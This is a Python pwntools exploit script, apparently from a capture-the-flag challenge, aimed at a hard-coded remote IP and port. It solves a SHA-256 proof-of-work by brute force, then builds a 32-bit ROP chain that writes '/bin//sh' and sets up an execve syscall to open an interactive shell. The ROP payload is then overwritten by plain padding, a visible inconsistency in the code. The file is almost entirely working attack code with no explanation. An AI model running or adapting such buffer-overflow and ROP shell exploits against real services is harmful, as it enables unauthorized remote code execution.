from pwn import *
from hashlib import sha256

context.log_level = 'debug'
p = remote('49.4.51.149', 25391)

p.recvuntil("()=")

sha = p.recvuntil(")=")[0:64]
# p.recvuntil(")=")
h = p.recvuntil(")=")[0:10]
print sha
print h

payload = 'a'*272 + p32(0x0806e9cb) + p32(0x080d9060) + p32(0x080a8af6) + p32(0x6e69622f) + p32(0x08056a85) + p32(0x0806e9cb) + p32(0x080d9064) + p32(0x080a8af6) + p32(0x68732f2f) + p32(0x08056a85) + p32(0x0806e9cb) + p32(0x080d9068) + p32(0x08056040) + p32(0x08056a85) + p32(0x080481c9) + p32(0x080d9060) + p32(
    0x0806e9f2) + p32(0x080d9068) + p32(0x080d9060) + p32(0x0806e9cb) + p32(0x080d9068) + p32(0x08056040) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x0807be5a) + p32(0x080495a3)
payload = 'a'*265
s = h.decode('hex')
for a in xrange(0, 0xff):
    for b in xrange(0, 0xff):
        for c in xrange(0, 0xff):
            x = s + chr(a) + chr(b) + chr(c)
            if sha256(x).hexdigest() == sha:
                print x.encode('hex')
                hh = x.encode('hex')
                p.sendline(hh)
                p.recv()
                # p.send('\n')
                break

a = p.recvuntil("We give you a little challenge, try to pwn it?\n")
#print a
p.sendline(payload)

sleep(1)
print p.recv()
p.interactive()
